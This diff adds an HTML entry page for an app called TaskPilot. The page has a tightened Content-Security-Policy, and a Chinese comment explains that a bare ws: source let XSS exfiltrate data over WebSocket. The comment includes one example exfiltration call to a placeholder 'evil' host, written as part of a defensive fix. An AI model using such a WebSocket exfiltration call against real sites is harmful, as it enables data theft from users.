@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- R13 修复 (low)：原 connect-src 'self' ws: ... 包含裸 ws:（CSP3 中也匹配 wss://），
+     任意主机。一旦 XSS 出现，攻击者可 new WebSocket('wss://evil/').send(...)，fetch 已被
+     default-src 拦住但 WebSocket 不受 default-src 覆盖。收紧成只在开发 HMR 走 ws://。 -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' http://localhost:* http://127.0.0.1:* ws://localhost:* ws://127.0.0.1:*;" />
+    <title>TaskPilot</title>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
